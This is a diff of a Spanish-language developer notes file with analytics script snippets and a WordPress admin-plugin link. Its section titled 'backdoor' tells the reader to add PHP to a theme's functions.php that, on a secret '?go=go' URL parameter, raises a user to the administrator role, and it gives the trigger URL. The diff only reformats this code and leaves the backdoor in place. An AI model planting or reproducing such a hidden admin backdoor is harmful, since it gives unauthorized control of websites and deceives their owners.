@@ -158,7 +158,7 @@ Antes de que empiece el primer DIV
 #### ANALYTICS METHOD
 
 ```javascript
-<script>
+    <script>
         document.addEventListener('DOMContentLoaded', function(){
 
                    console.log(":::::::::::::::::::::::::::::::::::::| VIVA PERÓN |::::::::::::::::::::::::::::::::::::::::")
@@ -197,7 +197,7 @@ Antes de que empiece el primer DIV
 
 #### TAG MANAGER METHOD
 
-     ```javascript
+```javascript
     <script>
         document.addEventListener('DOMContentLoaded', function(){
             var items = Array.from(document.querySelectorAll('.item_analytics'))
@@ -240,12 +240,11 @@ Antes de que empiece el primer DIV
 
 ```
 
-
 ## backdoor
+
 agregar en themes/[THEMA]/function.php del theme
 
-```
-
+```php
 add_action('wp_head', 'ready');
 function ready() {
 If ($_GET['go'] == 'go') {
@@ -259,10 +258,9 @@ $user->set_role('administrator');
 }
 
 ```
-Ir la ruta www.URL-DEL-SITIO?go=go
 
+Ir la ruta www.URL-DEL-SITIO?go=go
 
 ## AGCA LINK
 
 [URL DE WEB ]/wp-admin/tools.php?page=ag-custom-admin%2Fplugin.php#general-settings
-```
